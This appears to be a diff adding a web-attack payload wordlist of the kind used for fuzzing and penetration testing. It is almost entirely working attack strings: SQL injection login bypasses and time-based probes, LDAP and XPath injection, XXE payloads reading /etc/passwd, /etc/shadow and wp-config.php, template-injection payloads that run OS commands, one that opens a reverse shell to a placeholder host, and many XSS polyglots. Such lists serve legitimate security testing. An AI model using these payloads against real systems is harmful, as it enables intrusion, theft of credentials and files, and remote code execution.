@@ -1,0 +1,870 @@
+'"><svg/onload=promt=(5);>{{5*5}}
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/
+*)(uid=*))(|(uid=*
+*
+*)(&
+*))%00
+)(cn=))\x00
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+*/*
+*|
+/
+//
+//*
+@*
+|
+admin*
+admin*)((|userpassword=*)
+admin*)((|userPassword=*)
+x' or name()='username' or 'x'='y
+'-'
+' '
+'&'
+'^'
+'*'
+' or 1=1 limit 1 -- -+
+'="or'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+'-||0'
+"-||0"
+"-"
+" "
+"&"
+"^"
+"*"
+'--'
+"--"
+'--' / "--"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 2 like 2
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' -- -
+admin' #
+admin'/*
+admin' or '2' LIKE '1
+admin' or 2 LIKE 2--
+admin' or 2 LIKE 2#
+admin') or 2 LIKE 2#
+admin') or 2 LIKE 2--
+admin') or ('2' LIKE '2
+admin') or ('2' LIKE '2'#
+admin') or ('2' LIKE '2'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin';-- azer 
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
+md5("ffifdyop", true) = 'or'6�]��!r,��b�
+sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
+# from wapiti
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///c:/boot.ini"> ]>
+<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName><params></params></methodCall>
+<?xml version="1.0"?><change-log><text>Hello World</text></change-log>
+<?xml version="1.0"?><change-log><text>&quot;Hello World&quot;</text></change-log>
+<?xml version="1.0"?><!DOCTYPE change-log[ <!ENTITY myEntity "World"> ]><change-log><text>Hello &myEntity;</text></change-log>
+<?xml version="1.0"?><!DOCTYPE change-log[ <!ENTITY myEntity "World"><!ENTITY myQuote "&quot;"> ]><change-log><text>&myQuote;Hello &myEntity;&myQuote;</text></change-log>
+<!ENTITY systemEntity SYSTEM "robots.txt">
+<change-log> <text>&systemEntity;</text> </change-log>
+<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text> </change-log>
+<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "../../../../boot.ini"> ]> <change-log> <text>&systemEntity;</text> </change-log>
+<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text>; </change-log>
+<test> $lDOMDocument->textContent=<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]> </test>
+<?xml version="1.0"?><change-log><text><script>alert(1)</script></text></change-log>
+count(/child::node())
+x' or name()='username' or 'x'='y
+<name>','')); phpinfo(); exit;/*</name>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>"
+<xml ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+‘
+“
+<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "../../../boot.ini" ]> <change-log> <text>&systemEntity;</text>; </change-log>
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "php://filter/read-convert.base64-encode/resource=file:///C:/boot.ini" >]><doc><test>Contents of file: &xxe;</test></doc>
+<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo> 
+<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> 
+"}}</script><script>alert(1);</script></body></html><!-- 
+}}</script>'"
+}}</script>'
+'}}</script>'
+'}}</script>"
+<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "../../../../../../../etc/passwd">]><methodCall><methodName>&xxe</methodName></methodCall>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<xml ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "php://filter/read-convert.base64-encode/resource=file:///C:/htdocs/wordpress/wp-config.php" >]><doc><test>Contents of file: &xxe;</test></doc>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo><?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
+}}</script><script>alert(1);</script></body></html><!-- 
+"}}</script>'
+}}</script>""'"
+<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>
+<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="expect://ls"></image><image xlink:href="expect://ls" width="200" height="200"></image></svg>
+{{4*4}}[[5*5]]
+{{7*7}}
+{{7*'7'}}
+<%= 7 * 7 %>
+${3*3}
+${{7*7}}
+@(1+2)
+#{3*3}
+#{ 7 * 7 }
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{config.items()}}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+{{'a'.toUpperCase()}} 
+{{ request }}
+{{self}}
+<%= File.open('/etc/passwd').read %>
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+{{app.request.query.filter(0,0,1024,{'options':'system'})}}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+{$smarty.version}
+{php}echo `id`;{/php}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr("__class__")}}
+{{request.__class__}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+search=')] | //user/*[contains(*,'
+search=Har') and contains(../password,'c
+search=Har') and starts-with(../password,'c
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'${{7*7}}${7*7}%25{7*7}`read`$(read)`sleep 60`$(sleep 60)<?php die;?>&xxe;<script type="text/php">die;</script><!--#exec cmd="/bin/ps ax"--><!--#include virtual="/proc/version"-->👻
+jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'${{7*7}}${7*7}%25{7*7}`read`$(read)`sleep 60`$(sleep 60)<?php die;?>&xxe;<script type=\"text/php\">die;</script><!--#exec cmd=\"/bin/ps ax\"--><!--#include virtual=\"/proc/version\"-->👻
+%09 javascript://--></script></title></style>"/</textarea>*/<alert()/*' %0D %0A onclick=alert()//>a
+%09 javascript://'/</title></style></textarea></script>--><p" %0A onclick=alert()//>*/alert()/*
+%09 javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert()//>*/alert()/*
+%09 " onfocus=alert(1); " %0D %0A " onfocus=alert(1); " <a href="javascript://'/</title></style></textarea></script>--><p onclick=alert(1)>XXX #
+%09 //'/<@/></script></div></script>--><select */onclick=alert()><o>1<o>2')//"<!--
+%09 /</title/'/</style/</script/--><p" %0D %0A onclick=alert()//>*/alert()/*
+*/-->%0A'"<p onclick=alert()>
+%0D %0A %0D %0A jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+"'; %0D %0A alert(); %0D %0A onclick=alert(); %0D %0A onerror=alert();
+0x0://'/</title></style></textarea></script>--><p"/onclick %0D %0A =alert()//>*/alert()/*
+<a id='' onclick=alert()> %0D %0A <script>alert()</script> %0D %0A <input onfocus=alert() autofocus>
+alert(1)//"' ;alert(1)//onclick=alert(1) '" onclick=alert(1)
+';alert()//';alert()//";alert()//";alert(String.fromCharCode()//--></SCRIPT>">'><SCRIPT>alert()</SCRIPT>
+'|alert()|'+"|alert()|";alert()//</noscript></script></title></textarea>%0a<svg/onclick=alert()>
+alert()//<div onclick=alert()><img src=1 onerror=alert()><script>alert()</script>alert()
+"|alert()|" ' onclick=alert();//'</title></script></iframe></textarea><body onclick="alert()">
+alert();-->*/"/'</script>/alert()/onclick=alert()'"</title></textarea></style><p onclick=alert()>a'
+';alert();'"</script><p onclick=alert()> onclick=alert() />--><script>alert()</script>*/alert()/*
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+*/alert()/*\*'\"--></style></script><script>alert()</script><img src=x onclick=alert()><div onclick=alert()>
+alert();//'"--></title></style></textarea></script><a%0d%0A onclick=alert()//>x
+"a"; */ onclick=alert(); /*
+javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+<button '" onclick=alert(1)//>*/alert()/*
+<button ' onclick=alert(1)//>*/alert(1)//
+<!--/*--><![CDATA[/*>"'</textarea></div></title></script><a onclick=alert()>x<!--*/
+eval('alert()')//<div onclick=alert()><img src=1 onerror=alert()><script>alert()</script><a href=javascript:alert()>a</a>
+<input onclick=alert() onfocus=onclick() onload=onclick() onblur=onclick()><object onclick=alert()>javascript:/*--></marquee></script></title></textarea></noscript></style></xmp>">[img=1]<img -/style=-=expression(/*’/-/*',/**/eval(name)//);width:100%;height:100%;position:absolute;behavior:url(#default#VML);-o-link:javascript:eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>"
+<input type="button" value="click" onClick="alert('xss')">
+javascript://'//" %0A --></textarea></style></script></title><b onclick= %0A alert()//>*/alert()/*
+javascript:alert()//"//' %0D %0A onclick=alert()//--></style></script><script>alert()</script>*/alert()/*
+javascript:alert(1);"; onclick=alert(1);// '; onclick=alert(1);//--></style></script><button onclick=alert(1);> %0D %0A
+javascript:alert(1)//'//"//</script><script>alert(1)</script>--><div %0D %0A onclick=alert(1)//*/alert(1)/*>
+javascript:alert(1)//}</style></title></textarea></script>--><button '" onclick=alert(1)//>*/alert()/*
+javascript:alert()//';alert();'";alert()//</script> onclick=alert() --></title><script>alert()</script>*/alert() /*
+javascript:alert()//*/alert()/*</style></title></script>--><body onload=alert()>'"; onclick=alert() %0D %0A alert()
+javascript:alert()//*/alert()/*</style></title></script>--><body onload=alert()>'"; onclick=alert() alert() %0D %0A %0D %0A
+javascript:alert()//--></script></textarea></style></title><a"//' %0D %0A onclick=alert()//>*/alert()/*
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/* %0D %0A
+javascript:alert();//</script></textarea></title></style>%0d%0a<x onclick=alert()//>x
+javascript:alert()//<svg/onload=alert()>'-alert("-alert()-")-'
+javascript:alert()//</title></style></script>-->";alert()//*/alert()/*<a ';alert()//\' onclick=alert()//> %0D %0A alert()//
+javascript:alert();//'"</title></style></textarea></script/--><a/%0d%0a onclick=alert()//>x
+javascript:alert()/*"'</title></style></textarea></script/-->*/<a%0d%0a onclick=alert()//>x
+javascript:alert()//</title></textarea></style></script --><svg '//" %0D %0A onclick=alert()//>
+javascript://'/</div></title></textarea></div></script>--><p" onclick=alert()//>*/alert()/*
+javascript://'</div></title></textarea></style></script>--><x" onclick=alert()//>*/alert()/*
+/´`'*--\\'">javascript:/*--></marquee></script></title></textarea></noscript></style></xmp>">[img=1]<img -/style=-=expression(/*’/-/*',/**/eval(name)//);width:100%;height:100%;position:absolute;behavior:url(#default#VML);-o-link:javascript:eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>"
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e %0D %0A
+jaVasCript:/*-/*`/*\`/*'/*"/**/( oNmouseover=alert() )//%0D%0a%0d%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript:/*--></script>">[img=1]<img -/style=-=expression(/*’/-/*',/**/alert()//);-o-link:javascript:eval(title);-o-link-source:current onclick=alert() background=javascript:alert()>"<svg onclick=alert()>
+javascript://--></script></textarea></title></style><hr onclick= %0D %0A onclick=alert()
+javascript://--></script></title></style>/"</textarea>/'/*/<alert()/*' %0A onclick=alert()//>a
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' %0A onclick=alert()//>a
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' %0A onclick=alert()//>a %0D %0A
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' %0D %0A onclick=alert()//>
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' %0D %0A onclick=alert()//>a
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>d
+javascript://'/</style></textarea></script>--><p" %0A onclick=alert()//>*/alert()/*
+jaVasCript://</stYle/'/</titLe/</teXtarEa/</scRipt/-->*/<alert()/*" %0A oNcliCk=alert()//>x
+javascript:/*--></textarea></style></button></script></meta><select/onclick='+/"/+/[*/[]/+alert()//'>
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' %0D %0A onclick=alert()//>/
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://*'"/</title></style></textarea></script>--><a%0A onclick=alert()//%0A>x
+javascript://</title></style></textarea>--></script><a"//' %0D %0A onclick=alert()//>*/alert()/*
+javascript://'"</title></style></textarea></script/--><a/%0d%0a onclick=alert()//>x
+javascript://'/</title></style></textarea></script>--><p" %0A onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p"%0A onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea>>/script>--><p" %0A onclick=alert()//>*/alert()/*
+javascript://'/>/title></style></textarea></script>--><p "%0A onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p" %0A onclick=alert()//>*/alert()/* %0D %0A
+javascript://'/</title></style></textarea></script>--><p" %0A onclick=alert()//>*/alert()/* zzzzz
+javascript://'/</title></style></textarea></script>--><p" %0D %0A onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript:/*'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/* %0D %0A
+javascript://'/</title></style></textarea</script--><q" %0a onclick=alert()//>*/alert()/*
+javascript://'/</title></style></textarea></script>--><select %0D %0A */onclick=alert()><o>1<o>'//"<!--
+javascript://'/</title></style></textarea></script>--><svg onclick=alert()
+javascript://'/</title></style></textarea></script>--><svg onclick=alert()//>*/alert()/*
+javascript:/*--></title></style></textarea></script><svg/onload=click() onclick='+/" /+/ onmouseover=1/+/[*/[]/+alert()//'>
+javascript://'/</title></style></textarea><svg" onclick=alert()//></script>-->*/alert()/*
+javascript://</title></textarea></style></script --><li '//" %0A '*/alert()/*', onclick=alert()//
+" onclick=alert(1)//<button ' onclick=alert()//>
+" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+" onclick=alert(1)//<button ' onclick=alert(1)//>*/alert(1)//
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+onclick=alert()//<b onclick=alert()//>*/alert()//'"--></style><SCRIPT>alert()</SCRIPT><div>onclick=alert()//<b' onclick=alert()//>*/alert()
+" onclick=alert() //<button ' onclick=alert()//>
